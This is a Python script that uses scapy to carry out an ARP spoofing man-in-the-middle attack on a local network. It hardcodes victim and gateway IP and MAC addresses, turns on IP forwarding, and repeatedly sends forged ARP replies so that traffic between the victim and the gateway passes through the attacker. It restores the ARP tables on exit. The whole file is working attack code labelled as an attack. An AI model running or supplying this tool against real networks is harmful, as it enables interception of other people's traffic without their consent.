import scapy.all as scapy
import time
import sys
import os

# Victim Info
target_ip = "102.168.1.105"
target_mac = "3E:3D:35:46:DE:74"

# Gateway Info
gateway_ip = "192.168.1.1"
gateway_mac = "d0:88:0c:70:db:3c"

interface = "wlan0"
# -------------------------------------------------------------

def enable_ip_forwarding():
    if sys.platform == "linux":
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    print(f"[*] IP Forwarding Activated")

def spoof(target_ip, target_mac, spoof_ip):
    # 1. Ethernet Frame (Layer 2)
    # Locking the target MAC address.
    ether_frame = scapy.Ether(dst=target_mac)
    
    # 2. ARP Packet
    # op=2 (Response)
    # pdst  = To whom? (Target IP)
    # hwdst = Target MAC
    # psrc  = Who are we spoofing? (Modem or Victim IP)
    # hwsrc = (Automatic) Our real MAC address. (Required for data flow!)
    arp_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    
    # 3. Merge Packets
    packet = ether_frame / arp_packet
    
    # 4. Send (Layer 2 - sendp)
    # verbose=False: Avoid unnecessary printing to the screen
    scapy.sendp(packet, verbose=False, iface=interface)

def restore(dest_ip, dest_mac, source_ip, source_mac):
    ether_frame = scapy.Ether(dst=dest_mac)
    arp_packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    packet = ether_frame / arp_packet
    scapy.sendp(packet, count=4, verbose=False, iface=interface)

# --- MAIN PROGRAM ---
try:
    # 1. First enable IP forwarding (Very Critical)
    enable_ip_forwarding()
    
    print("\n" + "="*60)
    print(f"[*] ATTACK STARTED: {interface} over")
    print(f"[*] Victim: {target_ip} ({target_mac})")
    print(f"[*] Gateway : {gateway_ip} ({gateway_mac})")
    print("="*60)
    print("[*] You can exit by pressing CTRL+C.\n")

    sent_packets_count = 0
    while True:
        # 1. Go to the victim: "I'm the gateway"
        spoof(target_ip, target_mac, gateway_ip)
        
        # 2. Go to the gateway: "I'm the victim"
        spoof(gateway_ip, gateway_mac, target_ip)
        
        sent_packets_count += 2
        # Dynamic printing to the screen
        sys.stdout.write(f"\r[+] Sent ARP Packet Count: {sent_packets_count}")
        sys.stdout.flush()
        
        # 2 second wait time, ideal for data flow.
        time.sleep(2)

except KeyboardInterrupt:
    print("\n\n[!] ATTACK STOPPED. (CTRL+C detected)")
    print("[*] ARP tables are being restored with real values (Restore)...")
    
    restore(target_ip, target_mac, gateway_ip, gateway_mac)
    restore(gateway_ip, gateway_mac, target_ip, target_mac)
    
    print("[*] Process completed. Goodbye!")
except Exception as e:
    print(f"\n[!] Error occurred: {e}")
